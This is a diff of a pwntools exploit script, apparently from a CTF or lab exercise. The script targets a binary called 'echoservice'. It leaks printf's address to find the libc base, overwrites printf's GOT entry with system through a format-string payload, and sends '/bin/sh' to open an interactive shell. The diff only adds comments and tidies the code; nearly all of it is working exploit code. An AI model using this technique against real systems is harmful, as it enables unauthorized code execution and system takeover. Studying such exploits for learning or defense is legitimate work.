@@ -5,14 +5,14 @@ from pwn import *
 elf = context.binary = ELF("/usr/bin/echoservice")
 libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
 
+
 # For GDB debugging
-gs = '''
-'''
 def start():
     if args.GDB:
-        return gdb.debug(elf.path, gdbscript=gs)
+        return gdb.debug(elf.path, gdbscript='continue')
     else:
         return process(elf.path)
+
 
 p = start()
 
@@ -43,12 +43,14 @@ libc.address = PRINTF - libc.sym['printf']
 
 log.success(f"LIBC base: {hex(libc.address)}")
 
-writes = { printf_got: libc.sym['system'] }
+# Overwrite printf with system
+writes = {printf_got: libc.sym['system']}
 
 payload = fmtstr_payload(6, writes, write_size='short')
 
 p.sendline(payload)
 p.clean()
-p.sendline(b"/bin/sh")
+p.sendline(b"/bin/sh")  # Run shell with system
 
+log.success("Enjoy your shell :)")
 p.interactive()
